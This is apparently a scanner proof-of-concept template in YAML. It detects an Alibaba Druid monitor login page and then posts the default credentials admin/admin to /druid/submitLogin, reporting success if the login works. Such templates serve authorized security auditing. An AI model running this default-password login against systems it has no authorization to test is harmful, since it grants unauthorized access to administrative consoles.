name: poc-yaml-druid-default-password
rules:
  - method: GET
    path: /druid/login.html
    follow_redirects: true
    expression: |
      response.body.bcontains(b"<title>druid monitor</title>") && response.status == 200
  - method: POST
    path: /druid/submitLogin
    body: loginUsername=admin&loginPassword=admin
    expression: |
      response.status == 200 && response.body.bcontains(b"success")
detail:
  author: D
